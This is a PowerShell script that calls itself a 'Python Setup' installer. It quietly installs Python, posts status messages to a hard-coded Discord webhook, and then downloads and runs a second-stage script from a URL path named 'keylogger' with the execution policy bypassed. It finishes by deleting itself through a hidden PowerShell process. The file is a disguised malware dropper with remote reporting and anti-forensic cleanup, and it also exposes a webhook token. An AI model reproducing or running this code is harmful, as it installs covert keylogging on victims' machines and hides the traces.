# =========================
# Configuration
# =========================

$WebhookURL = "https://discord.com/api/webhooks/1562173720053944422/mJ10Fm2Evz0KFomAOKSNgxDcazktPjFKziMXts4ykcdTwBSAv3dBw5LHi6mPq1QoT7dt"
$Headers = @{ "User-Agent" = "PowerShell" }

$PythonVersionFull = "3.12.1"

# =========================
# Helper: Send Discord Log
# =========================

function Send-WebhookMessage {
    param([string]$Message)

    $Body = @{ content = $Message } | ConvertTo-Json -Compress
    Invoke-RestMethod `
        -Uri $WebhookURL `
        -Method Post `
        -Headers $Headers `
        -Body $Body `
        -ContentType "application/json"
}

# =========================
# Start
# =========================

Send-WebhookMessage "**PowerShell 'Python Setup' script** started."

# =========================
# Check for Python
# =========================

$pythonCheck = python --version 2>$null
if ($?) {
    Write-Host "Python already installed: $pythonCheck"
   
    # Send control message to the server
    Send-WebhookMessage "**Python** is already **installed** on this system! Version: $($pythonCheck)"
}
else {
    Write-Host "Python not found. Installing..."
    Send-WebhookMessage "**PowerShell 'Python Setup' script** installing Python."

    try {
        $TempPath = [System.IO.Path]::GetTempPath()
        $InstallerPath = Join-Path $TempPath "python-installer.exe"
        $DownloadURL = "https://www.python.org/ftp/python/$PythonVersionFull/python-$PythonVersionFull-amd64.exe"

        Invoke-WebRequest -Uri $DownloadURL -OutFile $InstallerPath

        # Install Python for the current user (no admin rights needed)
        Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -NoNewWindow -Wait

        Remove-Item $InstallerPath -Force

        Send-WebhookMessage "**Python installed successfully.**"
    }
    catch {
        Send-WebhookMessage "**Python installation failed!** Error: $($_.Exception.Message)"
        throw
    }
}

# ===============================================
# Download 'dependencies setup' PowerShell script
# ===============================================

# Send control message to the server
Send-WebhookMessage "**PowerShell 'Python Setup' script** downloaded everything **successfully!**. Preparing for the cleanup."

try {
    $TempPath = [System.IO.Path]::GetTempPath()
    $InstallerPath = Join-Path $TempPath "dependencies.ps1"
    $DownloadURL = "https://studentKnowledge.github.io/keylogger/dependencies.ps1"

    Invoke-WebRequest -Uri $DownloadURL -OutFile $InstallerPath

    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$InstallerPath`"" -NoNewWindow -Wait
    }
catch {
    Send-WebhookMessage "**Python installation failed!** Error: $($_.Exception.Message)"
    throw
}

# Send control message to the server
Send-WebhookMessage "**PowerShell 'Python Setup' script** downloaded everything **successfully!**. Preparing for the cleanup."

# Wait for 5 seconds before cleanup
Start-Sleep -Seconds 5

# Send control message to the server
Send-WebhookMessage "**PowerShell 'Python Setup' script** has **successfully finished** the script!"
Write-Host "Execution was successfull!"

# Cleanup / auto-delete
$scriptPath = $MyInvocation.MyCommand.Path

# Run a new PowerShell process to delete the script after it finishes
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command Remove-Item -Path '$scriptPath' -Force" -WindowStyle Hidden

# Exit the script
exit